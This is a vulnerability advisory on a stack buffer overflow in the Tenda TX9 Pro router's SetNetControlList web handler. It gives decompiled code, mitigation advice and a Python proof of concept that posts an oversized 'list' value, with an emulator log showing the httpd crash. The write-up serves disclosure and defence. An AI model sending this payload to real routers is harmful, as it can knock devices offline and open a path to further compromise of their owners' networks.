# Buffer Overflow in Tenda Router TX9 Pro

----
- Related products：[TX9 Pro](https://www.tendacn.com/product/download/TX9Pro.html) Update Date：2021/12/24
- Hardware Version: V1.0
- Software Version: V22.03.02.10
- Download: [TX9 Pro Firmware-Tenda-All For Better NetWorking (tendacn.com)](https://www.tendacn.com/download/detail-4219.html)
----

- Author: anhnlq (aka h4niz) from VNG Cloud
- Date: 19/04/2022

----

### Root cause
I found a vulnerability in `SetNetControlList()` function, the root cause is lack of validate length of user input. The vulnerability code below:
```
int __fastcall SetNetControlList(_DWORD *a1)
{
  char *v2; // $v0
  int v3; // $v0
  char v5[32]; // [sp+1Ch] [-28h] BYREF

  memset(v5, 0, sizeof(v5));
  v2 = sub_4150CC((int)a1, (int)"list", (int)""); // Get value to `a1` but does not validate length
  sub_43157C((int)v2, '\n'); // Passing `a1` to sub_43157C function
  signal(0x12, 1);
  v3 = fork();
  if ( !v3 )
  {
    set_tc_rule();
    exit(0);
  }
  if ( v3 > 0 )
  {
    sprintf(v5, "{\"errCode\":%d}", 0);
    sub_41B47C(a1, v5);
  }
  return _stack_chk_guard;
}
```

By using `sub_5150CC()` to get input from user and pass to `a1` variable. I don't know why but most of get data method is have done by `GetValue()` function that validates length of input before assigns it to variable. After that, `a1` variable is passed to `sub_43157C()`, at there, the buffer overflow is trigged by `strcpy()` function.

```
int __fastcall sub_43157C(int a1, int a2)
{
[Truncated]
  char v14[256]; // [sp+6Ch] [-208h] BYREF
[Truncated]
  while ( 1 )
  {
    v4 = (_BYTE *)strchr(a1, a2);
    if ( !v4 )
      break;
    *v4 = 0;
    v5 = v4 + 1;
    memset(v14, 0, sizeof(v14));
    strcpy((int)v14, a1);

[Truncated]
  return _stack_chk_guard;
}
```
We can see, `v14` only has 256 bytes of length, however, the program passes unlimit data from user to this by `strcpy()`.

----

### POC
```
#-*- encoding: utf8 -*-
import requests

# Product: Tenda Router
# Related products：TX9 ProUpdate Date：2021/12/24
# Hardware Version:V1.0
# Software Version:V22.03.02.10


url = "http://192.168.1.13/goform/SetNetControlList"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'list': payload})
```

### Router output log:
```
 sudo qemu-mips -L firmadyne/images/1 firmadyne/images/1/usr/sbin/httpd 


Yes:

      ****** WeLoveLinux****** 

 Welcome to ...
main_test 481: g_lan_ip 0.0.0.0  admin
[httpd][debug]----------------------------webs.c,158
Unsupported setsockopt level=65535 optname=128
httpd listen ip = 0.0.0.0 port = 80
webs: Listening for HTTP requests at address 0.0.0.0
Unsupported setsockopt level=65535 optname=128
[192.168.1.13]..........
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
Segmentation fault
```


## Mitigation:
- Validate data length before passing to `strcpy()`
- Or use `strncpy()` instead of `strcpy()`